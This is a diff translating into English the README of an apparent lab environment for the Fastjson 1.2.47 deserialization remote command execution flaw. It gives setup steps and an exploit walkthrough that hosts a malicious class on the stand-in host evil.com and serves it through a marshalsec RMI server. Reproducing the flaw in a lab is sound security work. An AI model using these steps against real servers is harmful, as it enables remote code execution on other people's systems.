@@ -1,27 +1,29 @@
-# Fastjson 1.2.47 远程命令执行漏洞
+# Fastjson 1.2.47 Deserialization Remote Command Execution
 
-Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-参考链接：
+Fastjson is a JSON parser developed by Alibaba, known for its superior performance and widely used in Java projects across various companies. After version 1.2.24, Fastjson added a deserialization whitelist. However, in versions prior to 1.2.48, attackers could bypass the whitelist check using specially crafted JSON strings and successfully execute arbitrary commands.
 
-- https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
-- https://www.freebuf.com/vuls/208339.html
+References:
 
-## 漏洞环境
+- <https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955>
+- <https://www.freebuf.com/vuls/208339.html>
 
-执行如下命令启动一个spring web项目，其中使用fastjson作为默认json解析器：
+## Environment Setup
+
+Execute the following command to start a Spring web project that uses Fastjson 1.2.45 as its default JSON parser:
 
 ```shell
 docker compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8090`即可看到一个json对象被返回，我们将content-type修改为`application/json`后可向其POST新的JSON对象，后端会利用fastjson进行解析。
+After the server starts, visit `http://your-ip:8090` to see a JSON object returned. You can POST new JSON objects by changing the content-type to `application/json`, and the backend will use Fastjson to parse them.
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-目标环境是`openjdk:8u102`，这个版本没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以简单利用RMI进行命令执行。
+The target environment is `openjdk:8u102`, which doesn't have the `com.sun.jndi.rmi.object.trustURLCodebase` restriction. We can easily execute commands using RMI.
 
-首先编译并上传命令执行代码，如`http://evil.com/TouchFile.class`：
+First, compile and upload the command execution code, such as `http://evil.com/TouchFile.class`:
 
 ```java
 // javac TouchFile.java
@@ -42,13 +44,13 @@ public class TouchFile {
 }
 ```
 
-然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个RMI服务器，监听9999端口，并制定加载远程类`TouchFile.class`：
+Then, using the [marshalsec](https://github.com/mbechler/marshalsec) project, start an RMI server listening on port 9999 and specify loading the remote class `TouchFile.class`:
 
 ```shell
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999
 ```
 
-向靶场服务器发送Payload：
+Send the payload to the target server:
 
 ```
 {
@@ -66,8 +68,8 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 ![](1.png)
 
-可见，命令`touch /tmp/success`已成功执行：
+As shown below, the command `touch /tmp/success` has been successfully executed:
 
 ![](2.png)
 
-更多利用方法请参考JNDI注入相关知识。
+For more exploitation methods, please refer to JNDI injection related knowledge.
